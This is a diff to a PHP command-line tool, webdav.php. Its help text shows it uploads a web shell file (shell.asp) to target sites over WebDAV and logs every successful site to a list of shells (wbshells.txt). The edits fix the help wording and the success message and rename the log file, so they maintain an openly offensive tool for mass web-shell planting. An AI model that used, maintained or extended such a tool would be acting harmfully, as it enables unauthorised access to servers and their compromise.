@@ -20,7 +20,7 @@ function help() {
    echo "Lista:     | -l--lista\n";
    echo "Thread:    | -t--thread\n";
    echo "File:      | -f--file\n";
-   echo "Create:    | -c--file\n\n";
+   echo "Create:    | -c--create\n\n";
    echo "Single:\n\n";
    echo "Usage: php webdav.php -d xxx -f xxx -c xxx\n";
    echo "Example: php webdav.php -d www.example.com -f /path/shell.asp -c shell.asp\n\n";
@@ -113,8 +113,8 @@ $result = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 curl_close($ch);
 fclose($fp);
 if($result == 200 || $result == 201) {
-    echo "Create Sucessful\n\n";
-   file_put_contents("createshell.txt", $site."\n", FILE_APPEND);
+    echo "Created Successfully\n\n";
+   file_put_contents("wbshells.txt", $site."\n", FILE_APPEND);
 } else {
   echo "Failed\n\n";
   }
